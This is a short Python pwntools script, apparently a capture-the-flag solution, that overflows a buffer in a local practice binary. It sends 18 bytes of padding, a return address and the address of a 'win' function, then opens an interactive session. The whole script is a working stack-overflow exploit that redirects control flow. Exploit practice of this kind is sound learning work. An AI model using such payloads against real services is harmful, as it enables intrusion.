from pwn import *

e = ELF("bin/out")

if args.LOCAL:
    p = e.process(cwd="bin/")
else:
    p = remote("localhost", 5000)

main_ret = 0x0040128a

payload = b"a" * 18
payload += p64(main_ret)
payload += p64(e.sym['win'])

print(p.recvuntil(b"> "))
p.sendline(payload)
# print(p.recvline())

p.interactive()
